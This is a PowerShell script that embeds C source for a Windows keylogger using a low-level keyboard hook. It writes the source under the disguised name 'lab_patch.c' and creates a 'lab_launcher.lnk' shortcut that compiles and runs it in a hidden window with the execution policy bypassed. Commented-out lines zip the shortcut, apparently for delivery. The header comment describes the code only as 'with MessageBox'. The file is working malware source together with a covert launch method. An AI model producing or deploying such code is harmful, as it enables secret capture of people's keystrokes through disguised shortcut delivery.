# gen.ps1 - Creates a shortcut that compiles and runs embedded C code

# Embedded C code with MessageBox
$code = @"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

HHOOK hHook = NULL;
FILE *logFile = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = p->vkCode;
            logFile = fopen("keylog.txt", "a+");
            if (logFile) {
                fprintf(logFile, "Key: %lu\n", vkCode);
                fclose(logFile);
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    MSG msg;
    HINSTANCE hInstance = GetModuleHandle(NULL);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (!hHook) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
        return 1;
    }
    MessageBox(NULL, "Keylogger running! Press OK to stop.", "Info", MB_OK);
    while (GetMessage(&msg, NULL, 0, 0) > 0) {}
    UnhookWindowsHookEx(hHook);
    return 0;
}
"@

# Write to temp folder
$t = [IO.Path]::GetTempPath()
$src = Join-Path $t 'lab_patch.c'
$exe = Join-Path $t 'lab_patch.exe'
Set-Content -Path $src -Value $code

# Create the shortcut
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("$PWD\lab_launcher.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"gcc '$src' -o '$exe' -mwindows; & '$exe'`""
$Shortcut.WindowStyle = 7
$Shortcut.WorkingDirectory = "$PWD"
$Shortcut.Save()



# # Zip the .lnk file
# $zipPath = Join-Path $PWD "lab_launcher.zip"
# Compress-Archive -Path $lnkPath -DestinationPath $zipPath -Force

# Write-Host "✅ .lnk created and zipped as lab_launcher.zip"